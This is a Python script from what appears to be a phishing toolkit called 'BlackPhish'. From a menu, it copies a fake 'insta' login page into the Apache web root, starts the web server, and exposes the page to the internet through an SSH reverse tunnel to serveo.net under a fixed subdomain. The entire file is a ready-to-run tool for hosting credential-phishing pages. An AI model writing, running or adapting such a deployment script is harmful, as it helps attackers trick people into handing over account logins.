try:
    import os
    #subproccess
        
except ImportError():
    print("Error importing")
    exit(1)


def install(): # Host webpage #
    os.system('cp /usr/share/Blackphish/insta /var/www/html/')
def serveo_forward(): # Port forward to serveo#
    os.system('nohup ssh -R inc0gnit0:80:localhost:80 serveo.net')
    #subprocess.Popen(["rm","-r","some.file"])

def main():  # Main script #
    choice = input("[BlackPhish] -> ") # Get user input #
    if choice == "1":
        print('[*] Copying Files')
        install()
        print('[*] Starting Apache2 Service')
        os.system('service apache2 start')
        serveo_forward()
        print('[*] Forwarding Traffic to \"https://inc0gnit0.serveo.net/\"')
        print('[*] Done')
        #os.system('clear')
        main()

    #elif choice == "clean":
        #os.system('service apache2 stop')
            
    elif choice == "":
        main()

    elif choice == "clear":
        os.system('clear')
        main()

    #elif choice == "help"
        #print('')
    

try: # This will start the script
	if __name__ == '__main__':
		main()

except KeyboardInterrupt: # Will detect if they exit #
	print("\n")
	print("Exiting")
	exit(0)
